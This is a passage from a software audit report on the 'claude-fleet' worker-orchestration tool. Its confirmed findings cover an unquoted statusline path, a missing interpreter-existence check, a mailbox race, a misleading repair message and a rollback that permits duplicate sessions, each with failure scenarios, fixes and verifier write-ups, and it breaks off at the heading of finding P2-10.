`"command": "\"{{PYTHON}}\" \"{{FLEET_HOME}}/bin/hooks/posttooluse_mailbox.py\""` — and `_hook_script_tokens` (bin/fleet.py:8007) carries a docstring explaining the quotes exist as "a prior fix for spaced install paths, e.g. \"C:/Users/.../python.exe\"". The statusline installer never got that fix.

The only test on this string is `tests/test_terminal_surface.py:1263 test_statusline_command_uses_forward_slashes`, which asserts `"\\" not in cmd` and nothing about quoting or spaces.

**Failure scenario**

Operator has Python at the default all-users location `C:\Program Files\Python313\python.exe` (or clones the repo under `C:\Users\John Doe\claude-fleet`) and runs `fleet init --statusline`. `~/.claude/settings.json` gets `"command": "C:/Program Files/Python313/python.exe C:/.../bin/fleet_statusline.py"`. Claude Code hands that to a shell, which tries to execute `C:/Program` with `Files/Python313/python.exe` as argv[1]; the process fails to start. The statusline renders nothing, forever, with no error anywhere — the very failure mode fleet_statusline.py's header ("the operator got a permanently BLANK statusline with no way to tell why") was written to eliminate. `fleet doctor` has no check for the installed statusLine, so nothing reports it.

**Fix**

Quote both segments the way the hook template does: `"command": f'"{Path(sys.executable).resolve().as_posix()}" "{script}"'`. Add a test that monkeypatches `sys.executable` to a path containing a space and asserts the emitted command has the interpreter path enclosed in quotes.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I could not refute this on the reachability lens. Every link in the chain checks out against the code.  1. The branch is live, not dead. bin/fleet.py:16030 registers `--statusline`; cmd_init at bin/fleet.py:3777-3779 calls `_install_statusline(force=..., chain=...)`; `_install_statusline` at bin/fleet.py:3667-3674 unconditionally writes `settings["statusLine"]["command"] = f"{Path(sys.executable).resolve().as_posix()} {script}"` and then writes the file at 3674. No early return, no platform guard, no flag gating that assignment. The repo advertises it as the supported install path (user_settings_path() docstring, bin/fleet.py:283-288: "the ONLY file outside FLEET_HOME that fleet ever writes, and only via `fleet init --statusline`").  2. The assumed input is possible and nothing upstream normalizes or validates it. `sys.executable` is taken raw; `.resolve().as_posix()` changes separators only — never quotes, never 8.3-shortens. `script` comes from statusline_script_path() (bin/fleet.py:312-313) = `FLEET_HOME / "bin" / "fleet_statusline.py"`, and FLEET_HOME (bin/fleet.py:85) is env/`__file__`-derived with no space check anywhere. Grepping for space handling across bin/fleet.py, bin/fleet_statusline.py and bin/hooks/*.py yields exactly one hit: the *hook*-path fix documented at bin/fleet.py:8013 — which is the finding's own point (the fix exists for hooks and was never applied here).  3. Nothing downstream catches it. I enumerated the doctor check list at bin/fleet.py:9101-9126: `_doctor_check_instance_settings` inspects `state/worker-settings.json` hook commands only. No check reads `~/.claude/settings.json`'s statusLine. And fleet_statusline.py's exit-0/print-nothing doctrine (bin/fleet_statusline.py:14-18, 36-41) guarantees no error surfaces from the child either, so the failure really is silent.  4. The "executed through a shell" premise is the repo's own measured position, not the reviewer's guess: bin/fleet_statusline.py:293-295 runs a captured settings.json command with `shell=True` under the comment "the command is a shell string straight out of settings.json", and CLAUDE.md's forward-slash rule states settings.json commands go through Git Bash `sh -c`.  5. The only test on the string, tests/test_terminal_surface.py:1263-1267, asserts `"\\" not in cmd` and nothing about quoting — confirmed by reading it.  The only thing I would sharpen rather than refute is the mechanism. Under `sh -c`, word-splitting breaks both spaced-path variants. Under cmd.exe/CreateProcess, the *interpreter*-with-space case (`C:/Program Files/Python313/python.exe`) can accidentally survive, because CreateProcess retries successive space-delimited prefixes for an unquoted application name. The spaced-*repo* case is shell-independent: `python.exe C:/Users/John Doe/claude-fleet/bin/fleet_statusline.py` splits into two argv entries under every shell, python tries to open `C:/Users/John`, exits nonzero, blank statusline forever.  On this machine neither path currently contains a space (sys.executable = C:/Users/Techn/AppData/Local/Programs/Python/Python313/python.exe; FLEET_HOME = C:/proga/claude-fleet), so it does not bite today — but that is one operator's layout, not a guard in the code, and an all-users python.org install puts the interpreter under `C:\Program Files\`. "Unreachable" is not defensible.
- *(confidence: high)* I re-read bin/fleet.py:3667-3672 and the reviewer quoted it exactly: `"command": f"{Path(sys.executable).resolve().as_posix()} {script}"`, with the adjacent comment itself stating the string is executed through a shell. I reproduced the emitted settings by monkeypatching sys.executable to "C:\\Program Files\\Python313\\python.exe" and user_settings_path to a temp file (no tracked file modified); the written command is `C:/Program Files/Python313/python.exe C:/proga/claude-fleet/bin/fleet_statusline.py` — unquoted, so a shell execs `C:/Program` (sh -c: exit 127; cmd /c: not recognized) and fleet_statusline.py's own never-blank defenses never run because the process never starts.  The "already covered" escape hatches all fail. I read the entirety of TestInitStatusline (tests/test_terminal_surface.py:1239-1333) and TestStatuslineChainInstall (1336-1379): the only assertion on this string is line 1267 `assert "\\" not in cmd`; nothing asserts quoting and nothing exercises a spaced path. And this is not a speculative hazard the project has never met: tests/test_core.py:681-700 `test_command_paths_are_double_quoted_for_spaces` records it as a "HIGH adversarial finding: an unquoted {{PYTHON}}/{{FLEET_HOME}} substitution word-splits under Git Bash `sh -c` (exit 127) ... silently killing the hook", worker-settings.template.json carries the resulting quote fix, and the live rendered state/worker-settings.json shows it. The statusline installer is the one analogous call site that never got it. Corroborating the shell premise: bin/fleet_statusline.py:290-300 runs a settings.json statusline command with shell=True ("the command is a shell string straight out of settings.json").  The no-detector claim also holds: I enumerated the registered checks at bin/fleet.py:9101-9125; _doctor_check_instance_settings (:8024) inspects only hook commands (backslashes, script existence), and no check reads ~/.claude/settings.json's statusLine, so the breakage surfaces nowhere. I found no misread of control flow, Windows vs POSIX behavior, stdlib semantics, or existing test coverage.

---

### P2-6 — doctor's hook checks never verify the baked interpreter exists, so a Python upgrade silently disables every hook

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `hooks-statusline`  |  **Category:** silent-failure
- **Location:** `bin/fleet.py:7986`

**What is wrong**

```python
_HOOK_SCRIPT_TOKEN_RE = re.compile(r"\S+\.py\b")
```
`_doctor_check_instance_settings` (bin/fleet.py:8024) and `_doctor_check_hook_registration` (bin/fleet.py:8978) both existence-check only the tokens this regex yields — i.e. only the `*.py` script paths. The `{{PYTHON}}` half of every rendered command (`"C:/Users/.../Python313/python.exe"`) matches nothing and is never checked, yet `fleet init` bakes it in permanently from `sys.executable` (bin/fleet.py:3767) precisely because "hooks run outside fleet.py, spawned by `claude`, so they cannot fall back to a bare `py`/`python3` on PATH" (cmd_init docstring).

The two hook-smoke checks do not cover it either: `_run_hook_smoke` (bin/fleet.py:8065) launches `run([sys.executable, str(script_path)], ...)` — the interpreter running doctor, not the one baked into the instance. `_doctor_check_instance_freshness` only compares template vs instance mtimes, which a Python upgrade does not touch.

Verified by running the shipped checks against a crafted instance whose interpreter path does not exist:
```
cmd = '"C:/Users/Techn/AppData/Local/Programs/Python/Python399/python.exe" ".../posttooluse_mailbox.py"'
_doctor_check_instance_settings()  -> ('worker-settings-instance', True, '... hook commands use forward slashes, referenced scripts exist')
_doctor_check_hook_registration()  -> ('hook-registration', True, 'all registered hook events known and command paths exist (PostToolUse)')
```

**Failure scenario**

Operator installs Python 3.14 and removes 3.13 (or moves from a per-user install to `C:\Program Files`, or deletes the venv `fleet init` was run from). `state/worker-settings.json` still names `.../Python313/python.exe`. Every worker turn from then on: Claude Code cannot start the hook process, so PostToolUse mailbox delivery stops (mid-turn steers never arrive), stop_mailbox stops blocking on mail, stop_outcome writes no outcome record — so `fleet result <name>` returns nothing and cost/token bookkeeping goes empty. `fleet doctor` prints `[PASS] worker-settings-instance` and `[PASS] hook-registration`, and `state/hook-errors.log` stays empty because the process never runs far enough to log. The operator's only diagnostic tool actively certifies the broken wiring as healthy.

**Fix**

In `_doctor_check_instance_settings`, parse the command with `shlex.split(cmd, posix=False)` (or strip quotes off the first whitespace-delimited token) and `Path(interp).exists()`-check the interpreter as well as the `.py` scripts. Cheaper alternative that also catches a wrong-version interpreter: change `_run_hook_smoke` to invoke the command string actually stored in the instance instead of `sys.executable`, so the smoke checks exercise the real wiring.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reviewer read the code correctly; I reproduced the exact behavior. (1) `_HOOK_SCRIPT_TOKEN_RE = re.compile(r"\S+\.py\b")` at bin/fleet.py:7986 cannot match the interpreter token: `\S+` never crosses the whitespace between the two quoted path segments, and "python.exe" contains no `.py` followed by a word boundary. (2) Live repro in a temp FLEET_HOME with a crafted instance naming a nonexistent `.../Python399/python.exe` produced exactly `_hook_script_tokens -> ['C:/proga/claude-fleet/bin/hooks/posttooluse_mailbox.py']`, `('worker-settings-instance', True, '...referenced scripts exist')`, `('hook-registration', True, '...command paths exist (PostToolUse)')`. (3) `_run_hook_smoke` at bin/fleet.py:8080 is `run([sys.executable, str(script_path)], ...)` — confirmed it uses doctor's own interpreter, not the baked one. (4) The interpreter is genuinely baked permanently: worker-settings.template.json renders `"{{PYTHON}}" "{{FLEET_HOME}}/bin/hooks/*.py"` and cmd_init (bin/fleet.py:3768) passes `sys.executable`; the live state/worker-settings.json carries the absolute Python313 path. `bin/hooks/run_py.sh` is not on this path (it serves the plugin/slash-command surface), so it does not mitigate. (5) I read the complete doctor `check_calls` list (bin/fleet.py:9100-9126): no row inspects the interpreter. `_doctor_check_instance_freshness` only compares mtimes; `_doctor_check_hook_errors` (8962) reads a log the never-started process cannot write; `_doctor_check_dead_suspected` (8196) is advisory-only (`ok=True`) so doctor still exits 0 even when the downstream symptom appears. No existing test covers interpreter existence — the only place a fake interpreter appears (tests/test_resilience.py:310) incidentally asserts PASS, pinning the gap rather than closing it. I found no misreading of control flow, Windows semantics, stdlib regex semantics, or existing coverage, so I cannot refute.
- *(confidence: high)* I tried to refute this on reachability and could not. (1) The mechanism is exactly as described: `_hook_script_tokens` (bin/fleet.py:8009-8021) is built on `_HOOK_SCRIPT_TOKEN_RE = re.compile(r"\S+\.py\b")` (bin/fleet.py:7986), and both `_doctor_check_instance_settings` (bin/fleet.py:8024) and `_doctor_check_hook_registration` (bin/fleet.py:8978) existence-check only those tokens. The quoted `{{PYTHON}}` half is never yielded. (2) No upstream guard exists. `_require_instance_settings` (bin/fleet.py:3301) checks only that the file exists, not what it points at. `instance_freshness_info` (bin/fleet.py:3177) compares template-vs-instance mtimes, which a Python change does not touch. The complete doctor roster (bin/fleet.py:9101-9125) contains no interpreter check; `grep -n "interpreter" bin/fleet.py` returns only docstrings plus `sys.executable` uses at 13400/13619 for fleet's own re-invocation. (3) The smoke checks genuinely do not cover it: `_run_hook_smoke` (bin/fleet.py:8065) launches `run([sys.executable, str(script_path)], ...)`. (4) The input state is real, not crafted-only: the live `state/worker-settings.json` in this repo contains `"C:/Users/Techn/AppData/Local/Programs/Python/Python313/python.exe"`, baked once from `sys.executable` at bin/fleet.py:3767, and `skills/fleet/SKILL.md:38` documents `fleet init` as a manual "once per machine" step — nothing re-renders it on spawn, respawn, doctor, or the skill startup ritual, so a stale baked path persists indefinitely. (5) I reproduced the exact claimed output against the shipped functions with a temp FLEET_HOME whose interpreter path does not exist and whose script path does: both checks returned ok=True with "referenced scripts exist" / "all registered hook events known and command paths exist (PostToolUse)". The only weakening I found is scope, not reachability: no doctor row turns red, but downstream advisory rows (`dead-suspected`, `mailboxes` undelivered-mail) at bin/fleet.py:8130/8196 would eventually name affected workers as always-ok=True NOTE text, so the operator gets an unattributed symptom rather than zero signal. Also the trigger is narrower than the title implies — a side-by-side Windows Python upgrade leaves Python313 in place; the path only dies if the old install is uninstalled/moved or the venv `fleet init` ran from is deleted. Neither of these makes the path unreachable.

---

### P2-7 — restore_mailbox_claim read-modify-writes the live mailbox, destroying a concurrently appended message

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `locking`  |  **Category:** race / lost update
- **Location:** `bin/fleet.py:1218`

**What is wrong**

```python
    if target.exists():
        try:
            newer = target.read_text(encoding="utf-8", errors="replace")
            target.write_text(claimed.rstrip() + "\n\n" + newer, encoding="utf-8")
            claim.unlink()
            return
```

This is a read-then-truncate-then-write against `mailbox/<sid>.md`, a file that `append_mailbox` writes without holding any lock (:4844) and with the lock held (:4729/:4786). `restore_mailbox_claim` itself is called on the dispatch-failure path OUTSIDE `fleet_lock` (:4856, :5012, :5555, :5565 -- the lock is taken only afterwards, for the registry rollback). Nothing serialises the read at line 1216 against a concurrent append. Unlike the Windows CRT issue above, this one loses data on POSIX too.

Secondary defect on the same lines: if `claim.read_text()` failed (:1212-1214) `claimed` is `""`, yet the branch still writes `"" + "\n\n" + newer` and then `claim.unlink()`s the claimed file -- deleting mail it never recovered.

**Failure scenario**

Process A's `fleet send w1 "msg1"` dispatch fails (e.g. `NativeDispatchError` from the roster join). A enters `restore_mailbox_claim` and executes `newer = target.read_text()`, capturing the current contents of `mailbox/<old_sid>.md`. Process B's `fleet send w1 "msg2"` appends "msg2" to that same file. A then executes `target.write_text(claimed + "\n\n" + newer)`, which TRUNCATES the file and writes back the snapshot taken before B's append. "msg2" is gone; B already printed `message queued to mailbox` and exited 0.

**Fix**

Do not rewrite `target` in place. Restore by appending the claimed content through the atomic append primitive (`_atomic_append_bytes(target, claimed_bytes)`) when `target` exists -- ordering is already best-effort, and the claim comment only says "prepend the (older) claimed content" -- or perform the whole restore under `fleet_lock` and make every `append_mailbox` call site take the lock too. Also skip the `claim.unlink()` when `claimed` came back empty because the read raised.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reachability holds. fleet_lock (bin/fleet.py:496) is the only lock in the file; _cmd_send_native releases it at :4841 (comment at :4843 says "Outside the lock") and restore_mailbox_claim runs at :4858 before the lock is re-taken at :4859. A concurrent writer is not hypothetical: during A's dispatch the registry still shows status="working", session_id=old_sid, so a second `fleet send` reaches append_mailbox at :4731 or :4788 and appends to the same mailbox/<old_sid>.md with no lock coordination against A's restore. The target.exists() branch is not dead code — tests/test_core.py:541 exists specifically to exercise "newer mail arriving while our claim was in flight". No upstream guard prevents the interleaving on the send path. However the finding is partly wrong in scope and severity, so it needs correction rather than acceptance as filed.
- *(confidence: medium)* PRIMARY MECHANISM: read correctly, not refuted. `bin/fleet.py:1217-1222` really is an unsynchronised read-then-truncate-then-write:  ``` 1217    if target.exists(): 1218        try: 1219            newer = target.read_text(encoding="utf-8", errors="replace") 1220            target.write_text(claimed.rstrip() + "\n\n" + newer, encoding="utf-8") ```  `Path.write_text` opens mode "w" (truncate), so anything appended between :1219 and :1220 is discarded. The reviewer's line cites are off by ~2 but the substance checks out: `append_mailbox` (:1231, plain `open(path,"a")`) is called unlocked at :4846 and under `fleet_lock` at :4731 / :4788, while `restore_mailbox_claim` is called at :4858, :5014, :5557, :5567 with the lock taken only *afterwards* for the registry rollback. Since the restoring process holds no lock, the appending process holding it buys nothing. I also confirmed the concurrent appender genuinely reaches `append_mailbox(old_sid, ...)` during A's dispatch window under both recompute outcomes: if recompute still says "working" it appends at :4788; if it says otherwise, the raw pre-check at :4713 finds `has_fresh_outcome` False and `_launch_claim_expired` False (A just restamped `last_dispatch_at` at :4839), so `in_flight` is True and it appends at :4731. Either way the target is `mailbox/<old_sid>.md`. No existing test covers this — `tests/test_core.py:524-566` (`TestRestoreMailboxClaim`) is entirely single-process; `test_restore_merges_with_newer_mail_claimed_content_first` writes the "newer" mail before calling restore, so it never touches the interleaving. It also violates the invariant the code states two lines above the failing call site (:4843-4845: "append the message FIRST so it rides the mailbox drain uniformly with any prior mail (never doubled, never silently dropped)").  WHAT IS WRONG WITH THE FINDING AS FILED:  (1) The stated failure scenario does not reach the cited lines. As written, B's `msg2` append is the *only* append during A's dispatch window — but A claimed the mailbox via `os.replace` in `claim_mailbox` (:1187), so `mailbox/<old_sid>.md` does not exist until someone appends. If B's append is the only one, `target.exists()` at :1217 is False and control goes to the `os.replace` at :1226, not the cited RMW. (That path clobbers too, but it is a different line.) To actually execute :1219-1220 you need a *prior* append to recreate the file, plus a *second* append landing inside the ~10-50 microsecond gap between the read and the truncate. That makes this a genuine but very narrow race — low, not medium — requiring a dispatch failure plus two concurrent sends to the same worker.  (2) The secondary sub-claim is refuted. I ran it: with `FLEET_HOME` in a temp dir, claim the mailbox, write "newer" back to the target, delete the claim file so `claim.read_text()` raises `FileNotFoundError` (an `OSError`), then call `restore_mailbox_claim`. Result: target contains `'\n\nnewer'` — nothing was deleted, because `claim.unlink()` at :1221 also raises `FileNotFoundError` and is swallowed by the same `except OSError` at :1223. For the branch to "delete mail it never recovered" the read must fail while the unlink succeeds, i.e. an existing-but-unreadable file in a writable directory — and `claim_mailbox` at :1191 already read that exact file successfully in the same process seconds earlier. No realistic trigger; the harm described does not follow from the code.  (3) The proposed fix's first option is not equivalent: `_atomic_append_bytes` (:9165) would append the claimed content *after* the newer mail, inverting the ordering the docstring at :1209 and the pinned test `test_restore_merges_with_newer_mail_claimed_content_first` (tests/test_core.py:541-553) both require. Taking `fleet_lock` around the whole restore is the only variant of the fix that preserves the documented ordering, and it must be paired with the unlocked `append_mailbox` at :4846.  Net: the defect exists, but at reduced severity and with a corrected reproduction; one of the two claimed defects is disproven.

---

### P2-8 — `fleet doctor --repair` reports "has been quarantined" when nothing was quarantined

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `locking`  |  **Category:** false claim / broken invariant
- **Location:** `bin/fleet.py:9038`

**What is wrong**

```python
    if repaired:
        return ("registry", False,
                f"registry was corrupt and has been quarantined -- {error}")
```

`repaired` is just `bool(args.repair)` (:9078) -- the flag the operator typed, not a result. But `load_registry()` has two raise paths and only ONE of them quarantines: the JSON/Unicode branch calls `_quarantine_registry` (:750-751), while the OSError branch does not (:752-753 `raise RegistryCorruptError(f"registry unreadable: {path}")`). Both land in the same `except RegistryCorruptError` at :9088, so an unreadable-but-present registry is announced as repaired.

Verified live against this tree (fresh temp FLEET_HOME, `state/fleet.json` made unreadable):

```
$ FLEET_HOME=...\fh2 py -3.13 bin/fleet.py doctor --repair
[FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: ...\fh2\state\fleet.json
--- artifacts:
fleet.json/
```

The file is still there under its own name; no `state/fleet.json.corrupt.<ts>` artifact was created.

**Failure scenario**

`state/fleet.json` becomes unreadable rather than malformed (ACL change, an I/O error, a Windows sharing violation from a concurrent writer, or the path replaced by a directory). Every view now refuses with `repair it with `fleet doctor --repair`` (REGISTRY_REPAIR_HINT, :708). The operator runs `fleet doctor --repair` and is told the registry "was corrupt and has been quarantined" -- so they expect the file to be gone and a `fleet.json.corrupt.*` artifact to hold their worker records. Neither is true: `_quarantine_artifacts()` still returns empty (so `_sweep_husks`/`_doctor_check_autoclean`/`_require_claim_holder` never see an incident), the registry is untouched, and the identical failure recurs on the next command with the operator now believing the sole repair path has already been tried and failed.

**Fix**

Make the message reflect what happened, not what was requested: have `load_registry` (or `cmd_doctor`) report whether a quarantine actually occurred -- e.g. check `_quarantine_artifacts()` / a flag on `RegistryCorruptError` -- and in the OSError case say `registry could not be read (not quarantined -- the file is intact): <error>` so the operator investigates permissions/locking rather than hunting for a `.corrupt` artifact that does not exist. `_quarantine_registry` (:628) has the same problem one level down: its rename is best-effort with `except OSError: pass`, yet it still returns the path and :751 says "quarantined to {quarantined}".

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I re-read every cited line and reproduced the claim end to end; the control flow is exactly as described.  CONTROL FLOW (bin/fleet.py): - `load_registry` (:735-761) has three raise paths, not two: JSON/Unicode (:751-753, quarantines), OSError (:754-755, `raise RegistryCorruptError(f"registry unreadable: {path}")` — NO quarantine, no event, no rename), and `_registry_corrupt_reason` non-None (:757-759, quarantines). The reviewer missed the third, but it is a quarantining path, so it does not weaken the claim. - `cmd_doctor` :9079 computes `repair = bool(getattr(args, "repair", False))` and passes it verbatim as the `repaired` argument at :9101. It is the flag the operator typed, never a result. All three raises land in the same `except RegistryCorruptError` at :9090. - `_doctor_check_registry` :9040-9042 then prints `registry was corrupt and has been quarantined -- {error}` unconditionally when `repaired` is truthy.  LIVE REPRODUCTION (read-only, fresh temp FLEET_HOME, `state/fleet.json` created as a directory so `Path.exists()` is True and `open()` raises PermissionError — the OSError branch):    $ FLEET_HOME=...\fh3 py -3.13 bin/fleet.py doctor --repair   [FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: ...\fh3\state\fleet.json    $ ls fh3/state/   fleet.json/          <- still present under its own name; no fleet.json.corrupt.<ts>  The row asserts a rename that provably did not happen. On a real deny-read ACL or a Windows sharing violation the same branch fires (stat still succeeds, so `exists()` is True and `open()` raises).  NOT ALREADY COVERED BY TESTS: `tests/test_view_quarantine.py` is the pin for this area, and every `--repair` test drives it through `_corrupt(home)`, which writes invalid JSON text — i.e. only the quarantining branch. `test_repair_says_it_quarantined_rather_than_telling_you_to` (:209-216) asserts `"quarantined" in out` for that case only. Nothing in tests/ exercises the OSError branch, and grep finds no assertion on the string "has been quarantined" anywhere.  The reviewer's secondary point also checks out: `_quarantine_registry` (:630-643) swallows the rename failure (`except OSError: pass`) yet still returns the path, so :753 / :759 can likewise claim "quarantined to {quarantined}" when the rename lost — a second false-report path on the same message family.  Nothing about Windows vs POSIX, stdlib semantics, or an existing test rescues this. I could not refute it.
- *(confidence: high)* I tried to refute this on reachability and could not — the branch is live and I hit it twice on this tree.  REACHABILITY CHECK (my lens): - The two-raise-path asymmetry is exactly as described. `bin/fleet.py:750-751` (JSON/Unicode) and `:757-758` (shape) both call `_quarantine_registry`; `bin/fleet.py:752-753` is `except OSError: raise RegistryCorruptError(f"registry unreadable: {path}")` with no rename. Both surface at the single `except RegistryCorruptError` in `cmd_doctor` (:9088-9092). - `repaired` really is the typed flag, not a result: `repair = bool(getattr(args, "repair", False))` (:9078) is passed straight into `functools.partial(_doctor_check_registry, registry_error, repair)` (:9100). Nothing between the raise and the message observes whether a rename happened. - The branch is not dead and there is no upstream guard. `path.exists()` (:744) is the only precondition; nothing validates readability. Live repro on this tree with a fresh `FLEET_HOME` whose `state/fleet.json` is unopenable:   `[FAIL] registry: registry was corrupt and has been quarantined -- registry unreadable: ...\state\fleet.json`   and `Get-ChildItem state` afterwards lists only `fleet.json` — no `fleet.json.corrupt.<ts>` artifact, file untouched. - No fleet code path *creates* an unreadable-but-present registry, so the trigger is environmental (ACL change, AV/backup/cloud-sync sharing violation, real I/O error, path replaced by a directory). That is not hypothetical on this platform, and the repo says so itself: `_replace_with_retry` (:812-830) exists because "`os.replace` onto a path another process has open fails with WinError 5/32 -- observed live crashing `cmd_kill`'s own `save_registry`". The same WinError class on `open()` for read lands in this OSError branch, and the docstring notes readers get no retry ("Readers are safe and never quarantine").  THE FINDING'S ROUTE TO THE BUG IS WRONG, BUT A STRONGER ONE EXISTS. The evidence claims "Every view now refuses with `repair it with `fleet doctor --repair`` (REGISTRY_REPAIR_HINT, :708)". That is false for this branch: `read_registry_no_repair` appends `suffix` only on the JSON and shape branches (:799, :804); its OSError branch (:801-802) omits it. I confirmed the views print bare `fleet: registry error: registry unreadable: <path>` with no hint (`fleet status`, `fleet peek foo`, exit 1). The operator is instead routed by `fleet doctor` itself: report-only prints `registry unreadable: ...; ... Rerun as `fleet doctor --repair` to quarantine it (renames it aside to state/fleet.json.corrupt.<ts>)` (:9044-9047, reproduced live) — an explicit promise the `--repair` run then falsely claims to have kept.  WHAT I DO REFUTE: the downstream-harm half of the failure scenario. "`_quarantine_artifacts()` still returns empty (so `_sweep_husks`/`_doctor_check_autoclean`/`_require_claim_holder` never see an incident)" is not a defect — no quarantine occurred, so those presence-keyed refusals correctly do not fire, and those readers still meet the unreadable file through their own loaders. There is no data loss: leaving the registry intact is the *right* outcome for an unreadable file, and the failure recurs loudly (nonzero exit, FAIL row) rather than silently. The true error text is also present in the same sentence after the em-dash. So this is a wrong-message defect, not a state-corruption one, and I would rate it low rather than medium.  The secondary note is also correct and same-class: `_quarantine_registry` (:628-641) swallows the rename failure (`except OSError: pass`) and still returns the path, so :751 can print "corrupt registry quarantined to <path>" for a file that never moved.

---

### P2-9 — send's fork-steer rollback restores `idle` after a join-expiry that means a live session exists, licensing a double-fork

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `native-substrate`  |  **Category:** race/orphan-session
- **Location:** `bin/fleet.py:4855`

**What is wrong**

```python
    except BaseException:                              # 4855
        restore_mailbox_claim(claim)
        with fleet_lock():
            data = load_registry()
            r = data["workers"].get(name)
            if (r is not None and r.get("status") == "working"
                    and r.get("session_id") == old_sid):
                r["status"] = "idle"                    # 4862
                r["last_dispatch_at"] = prior_last_dispatch_at
                save_registry(data)
        raise
```
This rollback treats every `dispatch_bg` failure as "nothing was launched". But one of `dispatch_bg`'s failure modes explicitly means the opposite — 9810-9813 raises `dispatched (short id {short_id}) but no roster entry joined within 60s -- possible DOA` only AFTER `proc.returncode == 0` and a short id was parsed, i.e. a real `claude --bg --resume <old_sid>` fork exists. So does the not-retry-safe wedge raise at 9877-9881, whose own text is `refusing the retry: redispatching over a possibly-live session risks two sessions on one task (C1)`. Unlike `cmd_spawn` (3888) and `_cmd_respawn_native` (5530), this path runs no `_fast_completion_sid` check and never calls `_report_stranded_native_turn`; it just puts the record back to a clean, healthy-looking `idle` at `old_sid`.

**Failure scenario**

Worker `w` is idle at `old_sid`. `fleet send w "run the migration"` pre-claims `working` (4834-4838), appends the message to `mailbox/<old_sid>.md`, and dispatches a fork. The daemon mints the session (returncode 0, short id `S` parsed) but the roster lags past `NATIVE_JOIN_VERIFY_SECONDS` (60s) — one fetch succeeded, so `_join_roster_by_short_id` returns None rather than raising, and 9810 raises. Session `S` is live and running the migration. The handler at 4855 restores the mailbox claim (so the message is queued again) and rolls the record back to `status="idle", session_id=old_sid`. `fleet status` now shows a healthy idle worker with pending mail. The operator (or a retry loop) runs `fleet send w "run the migration"` again -> the idle branch fork-steers `old_sid` a second time -> two live sessions forked from the same transcript both run the migration in the same cwd, both append to `state/journals/w.md`, and only the second is in the registry; the first is invisible to `fleet kill` (its sid is in neither `session_id` nor `retired_sids`) and to every husk sweep (it is status/pid-live).

**Fix**

Distinguish "nothing launched" from "launched but unverifiable" in the rollback: when the escaping `NativeDispatchError` carries a `short_id` (i.e. `getattr(exc, "short_id", None)` is set, which `dispatch_bg` only does once a real dispatch succeeded), do not restore `idle`. Either adopt the session (mirror spawn/respawn's `_fast_completion_sid` commit) or leave the record in a non-dispatchable state (e.g. keep `working` / mark `dead-suspected`) and call `_report_stranded_native_turn(name, ...)` with the short id, so the next `send` cannot fork `old_sid` a second time.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reachability holds on every link. (1) `_cmd_send_native` has only a bare `except BaseException` at bin/fleet.py:4857 — no NativeDispatchError arm, no `_fast_completion_sid`, no `_report_stranded_native_turn` — so both `dispatch_bg` raises that carry `short_id=` (the join-expiry raise at 9811-9815 and the unverified-wedge raise at 9877-9881, each of which fires only after `proc.returncode == 0` and a parsed short id) roll the record back to `status="idle", session_id=old_sid` at 4864-4865. (2) The join-expiry-with-a-real-session case is not speculative: `_join_roster_by_short_id` (9551-9591) returns None whenever one fetch succeeded and no prefix match appeared within the 60s window, and cmd_spawn's own handler comment at 3886-3892 states this raise happens "during this exact race" when the session actually ran — which is precisely why spawn (3891), respawn (5534) and the handoff path (13571/13591) all added the fast-completion/stranded-turn handling that send lacks. (3) Nothing upstream blocks the retry: the S3 restore of `prior_last_dispatch_at` re-anchors `has_fresh_outcome` on the previous completed turn, so `recompute_worker_native` returns idle and a second `fleet send` re-enters the idle fork-steer branch on the same `old_sid`; there is no roster probe for "already forked off this sid" and `native_epoch_suspicious` passes. (4) The stranded session is genuinely invisible: `_sweep_husks` skips any sid `not in owned` (the join-expiry sid is in no registry field and no event — the rollback appends none) at 7688, and separately skips `status`/`pid`-live entries at 7690; `_doctor_check_orphaned_claims` (8222) only scans mailbox/ceiling files by sid, never roster entries. (5) The mail duplication is real: `compose_prompt` (4849) drained the message into the prompt the dispatched session consumed, and `restore_mailbox_claim` (1207-1228) writes that same text back to `mailbox/<old_sid>.md`. No upstream validation, guard, or dead-code argument refutes this.
- *(confidence: high)* I re-read the cited code and reproduced the behavior. cmd_send's only dispatch-failure handler (bin/fleet.py:4857-4867) is an undiscriminated `except BaseException` that restores status=idle at old_sid plus the prior last_dispatch_at, with no inspection of the escaping exception's `short_id`. dispatch_bg raises with `short_id=` in three places that all mean a real `claude --bg --resume` session was minted: the join-expiry raise (9811-9815, reached only after returncode==0 and a parsed short id, and only when the roster was successfully observed at least once — 9584-9591 proves a full blackout raises the indeterminate error instead), the not-retry-safe wedge (9877-9881), and the double-wedge (9890-9895). NativeDispatchError's own docstring (9498-9510) states the short id is present exactly when "a real --bg dispatch happened and only the roster join itself failed to verify", so the proposed discriminator is the one the code already implies. The 9877 message is the sharpest evidence: dispatch_bg refuses its OWN retry to avoid "two sessions on one task (C1)", and cmd_send then restores a clean idle that licenses precisely that retry from the operator. Empirical repro (scratchpad pytest, py -3.13): idle w1 at old_sid + fresh outcome, dispatch_bg monkeypatched to raise the verbatim join-expiry error with short_id -> registry comes back status=idle/session_id=old_sid/retired_sids=[]; recompute_worker_native returns "idle"; the message is restored to mailbox/<old_sid>.md; a second cmd_send fork-steers with resume_sid=old_sid again (dispatches == [old_sid, old_sid]) and returns 0. tests/test_gate_arm_wedge.py:583 confirms a fork-steer leaves the parent roster entry untouched, so nothing else blocks the second fork. Existing tests only pin the rc=1 nothing-launched rollback (tests/test_native.py:2591 and :2606); the launched-but-unverifiable case is pinned for spawn (:823) and respawn (5522+ NativeDispatchError branch) but not for send. The only misreads are cosmetic line offsets (handler at 4857/idle at 4864, not 4855/4862; join-expiry raise at 9811-9815, not 9810-9813) and an over-strong contrast with cmd_spawn.

---

### P2-10 — _render_successor_task renders fleet.py UNQUOTED — a space in FLEET_HOME wedges every supervisor handoff

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `subprocess-security`  |  **Category:** correctness
- **Location:** `bin/fleet.py:13625`

**What is wrong**

